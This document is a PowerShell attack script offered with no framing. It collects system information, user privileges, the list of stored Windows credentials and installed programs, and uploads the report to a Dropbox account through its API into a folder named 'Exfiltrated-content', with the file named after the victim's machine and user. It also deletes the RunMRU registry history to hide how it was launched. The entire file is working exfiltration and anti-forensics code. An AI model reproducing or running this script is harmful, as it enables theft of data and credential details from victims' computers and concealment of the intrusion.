$REFRESH_TOKEN = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
$APP_KEY = "XXXXXXXXXXXXXXX"
$APP_SECRET = "XXXXXXXXXXXXXXX"

function Send-ToDropbox {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content,
        [Parameter(Mandatory = $true)]
        [string]$RefreshToken,
        [Parameter(Mandatory = $true)]
        [string]$AppKey,
        [Parameter(Mandatory = $true)]
        [string]$AppSecret,
        [string]$OutputFolder = "Exfiltrated-content",
        [string]$OutputFile = "[${env:COMPUTERNAME}-${env:USERNAME}].txt"
    )

    try {
        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers @{
            "Authorization" = "Bearer $((
            Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method Post -Headers @{
                "Content-Type" = "application/x-www-form-urlencoded"
            } -Body @{
                "grant_type" = "refresh_token";
                "refresh_token" = $RefreshToken;
                "client_id" = $AppKey;
                "client_secret" = $AppSecret
            }
        ).access_token)";
            "Content-Type" = "application/octet-stream";
            "Dropbox-API-Arg" = "{""path"":""/$OutputFolder/$OutputFile"",""mode"":""add"",""autorename"":true,""mute"":false}"
        } -Body $Content | Out-Null
    }
    catch {
        Write-Host "An error occurred: $_"
    }
}


Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force

$Report = "*** System Information ***`n $(SYSTEMINFO | Out-String)`n"
$Report += "*** User Information ***`n $(WHOAMI /ALL | Out-String)`n"
$Report += "*** Stored Credentials ***`n $(CMDKEY /LIST | Out-String)`n"
$Report += "*** Installed Programs ***`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)"

Send-ToDropbox -Content $Report -RefreshToken $REFRESH_TOKEN -AppKey $APP_KEY -AppSecret $APP_SECRET
